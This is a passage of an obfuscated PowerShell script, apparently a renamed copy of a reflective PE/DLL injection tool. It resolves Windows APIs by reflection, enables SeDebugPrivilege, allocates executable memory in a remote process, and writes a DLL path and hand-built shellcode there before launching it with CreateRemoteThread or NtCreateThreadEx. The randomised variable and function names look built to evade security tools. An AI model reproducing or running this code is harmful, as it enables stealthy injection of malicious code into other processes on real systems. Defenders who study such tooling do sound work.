        $zeaZARpZ99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($XcWiekJq99, $dQnHVVrX99)
        $YokgFkKj99 | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $zeaZARpZ99

        $qfaDuWvC99 = bite kernel32.dll OpenProcess
        $SCuIVDSX99 = gentler @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $jNdbkPzz99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($qfaDuWvC99, $SCuIVDSX99)
        $YokgFkKj99 | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $jNdbkPzz99

        $FqvptNoU99 = bite kernel32.dll WaitForSingleObject
        $avKdhBWj99 = gentler @([IntPtr], [UInt32]) ([UInt32])
        $oHpihtOq99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FqvptNoU99, $avKdhBWj99)
        $YokgFkKj99 | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $oHpihtOq99

        $vAxMlqUC99 = bite kernel32.dll WriteProcessMemory
        $MeLLdYNJ99 = gentler @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $TvhmfLRD99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vAxMlqUC99, $MeLLdYNJ99)
        $YokgFkKj99 | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $TvhmfLRD99

        $GqXDqNeT99 = bite kernel32.dll ReadProcessMemory
        $vTlGPrFu99 = gentler @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $njmJelmj99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GqXDqNeT99, $vTlGPrFu99)
        $YokgFkKj99 | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $njmJelmj99

        $iZwpjLOd99 = bite kernel32.dll CreateRemoteThread
        $MYpbPwUY99 = gentler @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $kIOZwDjT99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($iZwpjLOd99, $MYpbPwUY99)
        $YokgFkKj99 | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $kIOZwDjT99

        $zsvpYoDM99 = bite kernel32.dll GetExitCodeThread
        $xFmfJCqT99 = gentler @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $PPRSkSSt99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($zsvpYoDM99, $xFmfJCqT99)
        $YokgFkKj99 | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $PPRSkSSt99

        $tlLZYXTh99 = bite Advapi32.dll OpenThreadToken
        $DvioHKuT99 = gentler @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $pHURbFHk99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($tlLZYXTh99, $DvioHKuT99)
        $YokgFkKj99 | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $pHURbFHk99

        $IiESWvlS99 = bite kernel32.dll GetCurrentThread
        $QqTIkdJA99 = gentler @() ([IntPtr])
        $lSaHqRjI99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IiESWvlS99, $QqTIkdJA99)
        $YokgFkKj99 | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $lSaHqRjI99

        $eHEqjMTs99 = bite Advapi32.dll AdjustTokenPrivileges
        $CDlmykKb99 = gentler @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $XuSekbZj99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($eHEqjMTs99, $CDlmykKb99)
        $YokgFkKj99 | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $XuSekbZj99

        $FjVJXTzf99 = bite Advapi32.dll LookupPrivilegeValueA
        $QHZmUIAM99 = gentler @([String], [String], [IntPtr]) ([Bool])
        $ZIpZjtKc99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FjVJXTzf99, $QHZmUIAM99)
        $YokgFkKj99 | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $ZIpZjtKc99

        $YquyppBt99 = bite Advapi32.dll ImpersonateSelf
        $shFKhXuz99 = gentler @([Int32]) ([Bool])
        $IWDfXNpO99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($YquyppBt99, $shFKhXuz99)
        $YokgFkKj99 | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $IWDfXNpO99

        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
            $rkNDNAzp99 = bite NtDll.dll NtCreateThreadEx
            $XTuNrefv99 = gentler @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $lQuxGqFm99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($rkNDNAzp99, $XTuNrefv99)
            $YokgFkKj99 | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $lQuxGqFm99
        }

        $EMkBpyEu99 = bite Kernel32.dll IsWow64Process
        $ISufTFip99 = gentler @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $jkpBOMev99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($EMkBpyEu99, $ISufTFip99)
        $YokgFkKj99 | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $jkpBOMev99

        $DuiamZbf99 = bite Kernel32.dll CreateThread
        $YLsUDIyw99 = gentler @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $tKZdjCMr99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DuiamZbf99, $YLsUDIyw99)
        $YokgFkKj99 | Add-Member -MemberType NoteProperty -Name CreateThread -Value $tKZdjCMr99

        return $YokgFkKj99
    }



    Function smartphone
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $mvXzzKTd99,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $qFBBVIPJ99
        )

        [Byte[]]$HGZNlxMg99 = [BitConverter]::GetBytes($mvXzzKTd99)
        [Byte[]]$xpbZjdjy99 = [BitConverter]::GetBytes($qFBBVIPJ99)
        [Byte[]]$JmdOHbkF99 = [BitConverter]::GetBytes([UInt64]0)

        if ($HGZNlxMg99.Count -eq $xpbZjdjy99.Count)
        {
            $qzMAoKfy99 = 0
            for ($i = 0; $i -lt $HGZNlxMg99.Count; $i++)
            {
                $Val = $HGZNlxMg99[$i] - $qzMAoKfy99
                if ($Val -lt $xpbZjdjy99[$i])
                {
                    $Val += 256
                    $qzMAoKfy99 = 1
                }
                else
                {
                    $qzMAoKfy99 = 0
                }

                [UInt16]$Sum = $Val - $xpbZjdjy99[$i]

                $JmdOHbkF99[$i] = $Sum -band 0x00FF
            }
        }
        else
        {
            Throw "Cannot subtract bytearrays of different sizes"
        }

        return [BitConverter]::ToInt64($JmdOHbkF99, 0)
    }

    Function elastic
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $mvXzzKTd99,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $qFBBVIPJ99
        )

        [Byte[]]$HGZNlxMg99 = [BitConverter]::GetBytes($mvXzzKTd99)
        [Byte[]]$xpbZjdjy99 = [BitConverter]::GetBytes($qFBBVIPJ99)
        [Byte[]]$JmdOHbkF99 = [BitConverter]::GetBytes([UInt64]0)

        if ($HGZNlxMg99.Count -eq $xpbZjdjy99.Count)
        {
            $qzMAoKfy99 = 0
            for ($i = 0; $i -lt $HGZNlxMg99.Count; $i++)
            {
                [UInt16]$Sum = $HGZNlxMg99[$i] + $xpbZjdjy99[$i] + $qzMAoKfy99

                $JmdOHbkF99[$i] = $Sum -band 0x00FF

                if (($Sum -band 0xFF00) -eq 0x100)
                {
                    $qzMAoKfy99 = 1
                }
                else
                {
                    $qzMAoKfy99 = 0
                }
            }
        }
        else
        {
            Throw "Cannot add bytearrays of different sizes"
        }

        return [BitConverter]::ToInt64($JmdOHbkF99, 0)
    }

    Function prancer
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $mvXzzKTd99,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $qFBBVIPJ99
        )

        [Byte[]]$HGZNlxMg99 = [BitConverter]::GetBytes($mvXzzKTd99)
        [Byte[]]$xpbZjdjy99 = [BitConverter]::GetBytes($qFBBVIPJ99)

        if ($HGZNlxMg99.Count -eq $xpbZjdjy99.Count)
        {
            for ($i = $HGZNlxMg99.Count-1; $i -ge 0; $i--)
            {
                if ($HGZNlxMg99[$i] -gt $xpbZjdjy99[$i])
                {
                    return $true
                }
                elseif ($HGZNlxMg99[$i] -lt $xpbZjdjy99[$i])
                {
                    return $false
                }
            }
        }
        else
        {
            Throw "Cannot compare byte arrays of different size"
        }

        return $false
    }


    Function outgo
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt64]
        $Value
        )

        [Byte[]]$viwlNGcp99 = [BitConverter]::GetBytes($Value)
        return ([BitConverter]::ToInt64($viwlNGcp99, 0))
    }


    Function astonishingly
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $zGOIznqT99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($zGOIznqT99)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }

    Function raise
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $DQNljNKz99,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,

        [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
        [IntPtr]
        $Size
        )

        [IntPtr]$wYnVGFaW99 = [IntPtr](elastic ($StartAddress) ($Size))

        $iSXQrUxP99 = $PEInfo.EndAddress

        if ((prancer ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
        {
            Throw "Trying to write to memory smaller than allocated address range. $DQNljNKz99"
        }
        if ((prancer ($wYnVGFaW99) ($iSXQrUxP99)) -eq $true)
        {
            Throw "Trying to write to memory greater than allocated address range. $DQNljNKz99"
        }
    }

    Function shirker
    {
        Param(
            [Parameter(Position=0, Mandatory = $true)]
            [Byte[]]
            $Bytes,

            [Parameter(Position=1, Mandatory = $true)]
            [IntPtr]
            $gPxdFgeU99
        )

        for ($WcNPSPsM99 = 0; $WcNPSPsM99 -lt $Bytes.Length; $WcNPSPsM99++)
        {
            [System.Runtime.InteropServices.Marshal]::WriteByte($gPxdFgeU99, $WcNPSPsM99, $Bytes[$WcNPSPsM99])
        }
    }

    Function gentler
    {
        Param
        (
            [OutputType([Type])]

            [Parameter( Position = 0)]
            [Type[]]
            $iyYKvjiI99 = (New-Object Type[](0)),

            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $BLUdgJVj99 = [AppDomain]::CurrentDomain
        $dCINSHwq99 = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $DDEnPpJp99 = $BLUdgJVj99.DefineDynamicAssembly($dCINSHwq99, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $wftivHdY99 = $DDEnPpJp99.DefineDynamicModule('InMemoryModule', $false)
        $oUBRQwDZ99 = $wftivHdY99.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ZHKGuBzV99 = $oUBRQwDZ99.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $iyYKvjiI99)
        $ZHKGuBzV99.SetImplementationFlags('Runtime, Managed')
        $QuoHAcvE99 = $oUBRQwDZ99.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $iyYKvjiI99)
        $QuoHAcvE99.SetImplementationFlags('Runtime, Managed')

        Write-Output $oUBRQwDZ99.CreateType()
    }


    Function bite
    {
        Param
        (
            [OutputType([IntPtr])]

            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,

            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $ujuoLGZH99
        )

        $kyutOzsu99 = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $YSJVviyg99 = $kyutOzsu99.GetType('Microsoft.Win32.UnsafeNativeMethods')
        $sBXiWhZq99 = $YSJVviyg99.GetMethod('GetModuleHandle')
        #$Vqrhccgn99 = $YSJVviyg99.GetMethod('GetProcAddress')
        $Vqrhccgn99 = $YSJVviyg99.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
        $CZADPJeV99 = $sBXiWhZq99.Invoke($null, @($Module))
        $sRDKvyNo99 = New-Object IntPtr
        $YEMkddWo99 = New-Object System.Runtime.InteropServices.HandleRef($sRDKvyNo99, $CZADPJeV99)

        Write-Output $Vqrhccgn99.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$YEMkddWo99, $ujuoLGZH99))
    }

    Function centrifuge
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $YokgFkKj99,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $gbwmFOmN99,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        [IntPtr]$PZpNkIhc99 = $YokgFkKj99.GetCurrentThread.Invoke()
        if ($PZpNkIhc99 -eq [IntPtr]::Zero)
        {
            Throw "Unable to get the handle to the current thread"
        }

        [IntPtr]$psvkiPfL99 = [IntPtr]::Zero
        [Bool]$vfVoYjxw99 = $YokgFkKj99.OpenThreadToken.Invoke($PZpNkIhc99, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$psvkiPfL99)
        if ($vfVoYjxw99 -eq $false)
        {
            $NpepIqjb99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($NpepIqjb99 -eq $Win32Constants.ERROR_NO_TOKEN)
            {
                $vfVoYjxw99 = $YokgFkKj99.ImpersonateSelf.Invoke(3)
                if ($vfVoYjxw99 -eq $false)
                {
                    Throw "Unable to impersonate self"
                }

                $vfVoYjxw99 = $YokgFkKj99.OpenThreadToken.Invoke($PZpNkIhc99, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$psvkiPfL99)
                if ($vfVoYjxw99 -eq $false)
                {
                    Throw "Unable to OpenThreadToken."
                }
            }
            else
            {
                Throw "Unable to OpenThreadToken. Error code: $NpepIqjb99"
            }
        }

        [IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$gbwmFOmN99.LUID))
        $vfVoYjxw99 = $YokgFkKj99.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
        if ($vfVoYjxw99 -eq $false)
        {
            Throw "Unable to call LookupPrivilegeValue"
        }

        [UInt32]$TgEuzpdo99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$gbwmFOmN99.TOKEN_PRIVILEGES)
        [IntPtr]$kiwWqdth99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TgEuzpdo99)
        $RiLnQoOo99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($kiwWqdth99, [Type]$gbwmFOmN99.TOKEN_PRIVILEGES)
        $RiLnQoOo99.PrivilegeCount = 1
        $RiLnQoOo99.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$gbwmFOmN99.LUID)
        $RiLnQoOo99.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RiLnQoOo99, $kiwWqdth99, $true)

        $vfVoYjxw99 = $YokgFkKj99.AdjustTokenPrivileges.Invoke($psvkiPfL99, $false, $kiwWqdth99, $TgEuzpdo99, [IntPtr]::Zero, [IntPtr]::Zero)
        $NpepIqjb99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
        if (($vfVoYjxw99 -eq $false) -or ($NpepIqjb99 -ne 0))
        {
        }

        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($kiwWqdth99)
    }

    Function virtual
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [IntPtr]
        $TUzdqtBB99,

        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,

        [Parameter(Position = 3, Mandatory = $false)]
        [IntPtr]
        $LUTkGsDv99 = [IntPtr]::Zero,

        [Parameter(Position = 4, Mandatory = $true)]
        [System.Object]
        $YokgFkKj99
        )

        [IntPtr]$JpuPwqlg99 = [IntPtr]::Zero

        $fuZacQYq99 = [Environment]::OSVersion.Version
        if (($fuZacQYq99 -ge (New-Object 'Version' 6,0)) -and ($fuZacQYq99 -lt (New-Object 'Version' 6,2)))
        {
            $rpwCXuJO99= $YokgFkKj99.NtCreateThreadEx.Invoke([Ref]$JpuPwqlg99, 0x1FFFFF, [IntPtr]::Zero, $TUzdqtBB99, $StartAddress, $LUTkGsDv99, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
            $HQCSnxtC99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($JpuPwqlg99 -eq [IntPtr]::Zero)
            {
                Throw "Error in NtCreateThreadEx. Return value: $rpwCXuJO99. LastError: $HQCSnxtC99"
            }
        }
        else
        {
            $JpuPwqlg99 = $YokgFkKj99.CreateRemoteThread.Invoke($TUzdqtBB99, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $LUTkGsDv99, 0, [IntPtr]::Zero)
        }

        if ($JpuPwqlg99 -eq [IntPtr]::Zero)
        {
            Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
        }

        return $JpuPwqlg99
    }

    Function cudgelled
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $nrZUEnxp99,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $gbwmFOmN99
        )

        $QkgVbgXr99 = New-Object System.Object

        $vQzXoLpy99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($nrZUEnxp99, [Type]$gbwmFOmN99.IMAGE_DOS_HEADER)

        [IntPtr]$kfhViIIa99 = [IntPtr](elastic ([Int64]$nrZUEnxp99) ([Int64][UInt64]$vQzXoLpy99.e_lfanew))
        $QkgVbgXr99 | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $kfhViIIa99
        $wKXSKgtF99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($kfhViIIa99, [Type]$gbwmFOmN99.IMAGE_NT_HEADERS64)

        if ($wKXSKgtF99.Signature -ne 0x00004550)
        {
            throw "Invalid IMAGE_NT_HEADER signature."
        }

        if ($wKXSKgtF99.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
        {
            $QkgVbgXr99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $wKXSKgtF99
            $QkgVbgXr99 | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
        }
        else
        {
            $ecBCmqJw99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($kfhViIIa99, [Type]$gbwmFOmN99.IMAGE_NT_HEADERS32)
            $QkgVbgXr99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $ecBCmqJw99
            $QkgVbgXr99 | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
        }

        return $QkgVbgXr99
    }


    Function academic
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $CVDncjuZ99,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $gbwmFOmN99
        )

        $PEInfo = New-Object System.Object

        [IntPtr]$LuIjOnnW99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($CVDncjuZ99.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($CVDncjuZ99, 0, $LuIjOnnW99, $CVDncjuZ99.Length) | Out-Null

        $QkgVbgXr99 = cudgelled -nrZUEnxp99 $LuIjOnnW99 -gbwmFOmN99 $gbwmFOmN99

        $PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($QkgVbgXr99.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($QkgVbgXr99.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($QkgVbgXr99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($QkgVbgXr99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($QkgVbgXr99.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)

        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuIjOnnW99)

        return $PEInfo
    }


    Function oxidizers
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true)]
        [IntPtr]
        $nrZUEnxp99,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $gbwmFOmN99,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        if ($nrZUEnxp99 -eq $null -or $nrZUEnxp99 -eq [IntPtr]::Zero)
        {
            throw 'PEHandle is null or IntPtr.Zero'
        }

        $PEInfo = New-Object System.Object

        $QkgVbgXr99 = cudgelled -nrZUEnxp99 $nrZUEnxp99 -gbwmFOmN99 $gbwmFOmN99

        $PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $nrZUEnxp99
        $PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($QkgVbgXr99.IMAGE_NT_HEADERS)
        $PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($QkgVbgXr99.NtHeadersPtr)
        $PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($QkgVbgXr99.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($QkgVbgXr99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)

        if ($PEInfo.PE64Bit -eq $true)
        {
            [IntPtr]$wSYKHVIA99 = [IntPtr](elastic ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$gbwmFOmN99.IMAGE_NT_HEADERS64)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $wSYKHVIA99
        }
        else
        {
            [IntPtr]$wSYKHVIA99 = [IntPtr](elastic ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$gbwmFOmN99.IMAGE_NT_HEADERS32)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $wSYKHVIA99
        }

        if (($QkgVbgXr99.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
        }
        elseif (($QkgVbgXr99.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
        }
        else
        {
            Throw "PE file is not an EXE or DLL"
        }

        return $PEInfo
    }

    Function operation
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $hTcxIZqi99,

        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $OvOSKvQj99
        )

        $SjsRrlTg99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        $fWjWKxKV99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OvOSKvQj99)
        $xhsbDDpC99 = [UIntPtr][UInt64]([UInt64]$fWjWKxKV99.Length + 1)
        $jYYhjxBf99 = $YokgFkKj99.VirtualAllocEx.Invoke($hTcxIZqi99, [IntPtr]::Zero, $xhsbDDpC99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($jYYhjxBf99 -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process"
        }

        [UIntPtr]$VqeUSBMM99 = [UIntPtr]::Zero
        $BjJZNTzC99 = $YokgFkKj99.WriteProcessMemory.Invoke($hTcxIZqi99, $jYYhjxBf99, $OvOSKvQj99, $xhsbDDpC99, [Ref]$VqeUSBMM99)

        if ($BjJZNTzC99 -eq $false)
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if ($xhsbDDpC99 -ne $VqeUSBMM99)
        {
            Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }

        $iYisJnbh99 = $YokgFkKj99.GetModuleHandle.Invoke("kernel32.dll")
        $TekDefNc99 = $YokgFkKj99.GetProcAddress.Invoke($iYisJnbh99, "LoadLibraryA") #Kernel32 loaded to the same address for all processes

        [IntPtr]$jtGXsjsq99 = [IntPtr]::Zero
        if ($PEInfo.PE64Bit -eq $true)
        {
            $fMmwJMIc99 = $YokgFkKj99.VirtualAllocEx.Invoke($hTcxIZqi99, [IntPtr]::Zero, $xhsbDDpC99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($fMmwJMIc99 -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
            }

            $AoioTggA99 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $mVcCBjLR99 = @(0x48, 0xba)
            $CTEOmQmH99 = @(0xff, 0xd2, 0x48, 0xba)
            $zGxTWTxG99 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)

            $HOBbxkho99 = $AoioTggA99.Length + $mVcCBjLR99.Length + $CTEOmQmH99.Length + $zGxTWTxG99.Length + ($SjsRrlTg99 * 3)
            $HsgHcXzd99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($HOBbxkho99)
            $yPiEoovV99 = $HsgHcXzd99

            shirker -Bytes $AoioTggA99 -gPxdFgeU99 $HsgHcXzd99
            $HsgHcXzd99 = elastic $HsgHcXzd99 ($AoioTggA99.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($jYYhjxBf99, $HsgHcXzd99, $false)
            $HsgHcXzd99 = elastic $HsgHcXzd99 ($SjsRrlTg99)
            shirker -Bytes $mVcCBjLR99 -gPxdFgeU99 $HsgHcXzd99
            $HsgHcXzd99 = elastic $HsgHcXzd99 ($mVcCBjLR99.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($TekDefNc99, $HsgHcXzd99, $false)
            $HsgHcXzd99 = elastic $HsgHcXzd99 ($SjsRrlTg99)
            shirker -Bytes $CTEOmQmH99 -gPxdFgeU99 $HsgHcXzd99
            $HsgHcXzd99 = elastic $HsgHcXzd99 ($CTEOmQmH99.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($fMmwJMIc99, $HsgHcXzd99, $false)
            $HsgHcXzd99 = elastic $HsgHcXzd99 ($SjsRrlTg99)
            shirker -Bytes $zGxTWTxG99 -gPxdFgeU99 $HsgHcXzd99
            $HsgHcXzd99 = elastic $HsgHcXzd99 ($zGxTWTxG99.Length)

            $EKgGeOpZ99 = $YokgFkKj99.VirtualAllocEx.Invoke($hTcxIZqi99, [IntPtr]::Zero, [UIntPtr][UInt64]$HOBbxkho99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($EKgGeOpZ99 -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for shellcode"
            }

            $BjJZNTzC99 = $YokgFkKj99.WriteProcessMemory.Invoke($hTcxIZqi99, $EKgGeOpZ99, $yPiEoovV99, [UIntPtr][UInt64]$HOBbxkho99, [Ref]$VqeUSBMM99)
            if (($BjJZNTzC99 -eq $false) -or ([UInt64]$VqeUSBMM99 -ne [UInt64]$HOBbxkho99))
            {
                Throw "Unable to write shellcode to remote process memory."
            }

            $YjqbtwZj99 = virtual -TUzdqtBB99 $hTcxIZqi99 -StartAddress $EKgGeOpZ99 -YokgFkKj99 $YokgFkKj99
            $vfVoYjxw99 = $YokgFkKj99.WaitForSingleObject.Invoke($YjqbtwZj99, 20000)
            if ($vfVoYjxw99 -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
